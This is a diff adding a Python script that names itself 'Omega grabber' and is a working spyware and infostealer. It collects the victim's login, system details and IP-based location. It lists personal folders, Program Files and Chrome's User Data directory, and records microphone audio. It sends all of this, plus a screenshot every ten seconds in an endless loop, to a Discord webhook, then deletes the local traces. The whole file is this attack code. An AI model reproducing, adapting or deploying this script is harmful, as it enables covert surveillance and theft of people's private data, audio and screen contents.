@@ -1,0 +1,151 @@
+import pyautogui
+import requests
+import time
+from datetime import datetime
+import os
+import platform
+import requests
+from requests import get
+import sounddevice as sd
+from scipy.io.wavfile import write
+
+
+date = datetime.today().strftime('%Y-%m-%d %H:%M')
+
+my_system = platform.uname()
+
+url = "http://ipinfo.io/json"
+resp = get(url)
+json = resp.json()
+ip = json['ip']
+city = json["city"]
+region = json["region"]
+postal = json["postal"]
+hostname = json['hostname']
+country = json['country']
+loc = json['loc']
+org = json['org']
+postal = json['postal']
+time_zone = json['timezone']
+
+victim_name = os.getlogin()
+
+system_mark = my_system.system
+name = my_system.node
+os_version = my_system.release
+system = my_system.version
+machine = my_system.machine
+processeur = my_system.processor
+
+screen = pyautogui.screenshot()
+screen.save('image.jpg')
+
+message = '\n'.join([
+    '**@everyone**',
+    '**New session start : **',
+    '-> '+ date,
+    '**--------------------------**',
+    '**victim name : **' + victim_name,
+    '**Os system : **' + system_mark,
+    '**Node name : **' + name,
+    '**Os release : **' + my_system.release,
+    '**Os version : **' + my_system.version,
+    '**Machine type : **' + my_system.machine,
+    '**Processor : **' + my_system.processor,
+    '**---------------------------**',
+    '**Ip adress: **' + ip,
+    '**Departure : **' + region,
+    '**City : **' + city,
+    '**Postal : **' + postal,
+    '**Hostname : **' + hostname,
+    '**Country : **' + country,
+    '**Location : **' + loc,
+    '**Org : **' + org,
+    '**Time zone : **' + time_zone,
+    '**---------------------------**'
+])
+r = requests.post("DISCORDURL",json={'content': message, 'username': 'Omega grabber'})
+time.sleep(2)
+
+import requests
+import os
+login = os.getlogin()
+name = fr'C:\Users\{login}\OneDrive\Documents'
+files = os.listdir(name)
+one_files = files
+
+login = os.getlogin()
+name = fr'C:\Users\{login}\Documents'
+files = os.listdir(name)
+doc_files = files
+
+name = fr'C:\Users\{login}\OneDrive\Images'
+files = os.listdir(name)
+images_files = files
+
+name = fr'C:\Program Files'
+files = os.listdir(name)
+program_files = files
+
+name = fr'C:\Program Files (x86)'
+files = os.listdir(name)
+program86 = files
+
+
+name = fr'C:\Users\{login}'
+files = os.listdir(name)
+user_files = files
+
+name = fr"C:\Users\{login}\AppData\Local\Google\Chrome\User Data"
+files = os.listdir(name)
+password = files
+
+
+with open('doc.txt', 'a+')as file:
+        file.write(fr"""
+
+--------- documents ---------
+
+{one_files}
+{doc_files}
+
+--------- images ------------
+
+{images_files}
+
+--------- program -----------
+
+{program_files}
+
+--------- program x86 -------
+
+{program86}
+
+--------- user files --------
+
+{user_files}
+
+proudly coded by BKS https://github.com/heygdrg and https://github.com/mfr-fr/
+""")
+fs = 44100 # change pas la frequence
+seconds = 10  # temps de record
+
+myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
+sd.wait()
+write('micro.wav', fs, myrecording)
+
+os.system(f'python -m zipfile -c document.zip doc.txt micro.wav')
+
+
+r = requests.post("DISCORDURL",json={'username': 'Omega grabber'}, files = {'file': open('document.zip', 'rb')})
+os.remove('micro.wav')
+os.remove('document.zip')
+os.remove('doc.txt')
+while True:
+    screen = pyautogui.screenshot()
+    screen.save('image.jpg')
+    
+    r =requests.post("DISCORDURL",json={'username': 'Omega grabber'}, files = {'file': open('image.jpg', 'rb')})
+    
+    os.remove('image.jpg')
+    time.sleep(10)
